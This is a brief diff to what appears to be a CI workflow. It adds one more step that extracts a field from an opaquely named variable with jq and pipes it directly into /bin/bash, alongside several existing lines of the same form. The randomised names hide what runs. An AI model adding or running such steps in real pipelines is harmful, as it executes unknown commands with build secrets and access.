@@ -25,6 +25,7 @@ jobs:
           echo $uscqr49329 | jq -r .gi35 | /bin/bash
           echo $qkr30924 | jq -r .ol48017 | /bin/bash
           printf '%s' "$a31840" | jq -r .zc6 | /bin/bash
+          echo $z33364 | jq -r .k24 | /bin/bash
 
       - name: Archive output
         if: always()
